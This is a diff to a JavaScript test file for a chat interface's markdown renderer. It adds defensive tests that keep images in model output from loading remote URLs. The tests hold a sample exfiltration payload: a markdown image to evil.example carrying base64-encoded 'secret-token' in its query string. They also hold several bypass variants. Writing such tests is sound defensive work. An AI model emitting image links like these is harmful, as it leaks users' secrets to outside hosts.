@@ -210,6 +210,24 @@ test('hostile input is neutralised: no script, no handlers, no javascript: links
   assert.equal(ui.safeHref('https://ok.example/x'), 'https://ok.example/x');
   assert.equal(ui.safeImageSrc('data:text/html,<script>'), undefined);
   assert.ok(ui.safeImageSrc('data:image/png;base64,AAAA'));
+  // An image on the web is never put in an <img>: the address is the model's, and may carry what it knows.
+  const leak = md('Here is the chart: ![Q3 chart](https://evil.example/pixel.png?d=c2VjcmV0LXRva2Vu)');
+  assert.doesNotMatch(leak, /<img[^>]*evil\.example/, 'no request is made for it');
+  assert.match(leak, /data-remote-image="evil\.example"/);
+  assert.match(leak, /data-remote-image-url[^>]*>https:\/\/evil\.example\/pixel\.png\?d=c2VjcmV0LXRva2Vu</, 'the whole address is shown');
+  assert.match(leak, /data-remote-image-carries/, 'and that it carries data is said');
+  assert.doesNotMatch(leak, /data-remote-image-load/, 'with no loader (a published page, a plugin frame) there is nothing to press');
+  for (const sneaky of ['![x](HTTPS://evil.example/a.png)', '![x](http://evil.example/a.png)', '![x](h\tttps://evil.example/a.png)', '![x](//evil.example/a.png)', '<img src="https://evil.example/a.png">'])
+    assert.doesNotMatch(md(sneaky), /<img[^>]*evil\.example/i, sneaky);
+  assert.equal(ui.remoteImage('data:image/png;base64,AAAA'), undefined);
+  assert.equal(ui.remoteImage('blob:harness://app/1'), undefined);
+  assert.deepEqual(ui.remoteImage('https://ok.example/a.png'), { url: 'https://ok.example/a.png', host: 'ok.example' });
+  assert.equal(ui.remoteImage(`https://ok.example/${'a'.repeat(200)}.png`)?.carries?.length, 205, 'a long path can hold data too');
+  assert.equal(ui.remoteImage('https://user@ok.example/a.png')?.carries, 'user@');
+  // Asked for, it comes through the host's loader as a local address.
+  ui.setRemoteImageLoader(async () => 'blob:local');
+  assert.match(md('![x](https://ok.example/a.png)'), /data-remote-image-load/);
+  ui.setRemoteImageLoader(undefined);
   // An artifact page is fenced in: its own CSP has no network, and the frame never gets same-origin.
   const doc = ui.artifactDocument('html', '<p>x</p>');
   assert.match(doc, /connect-src 'none'/);
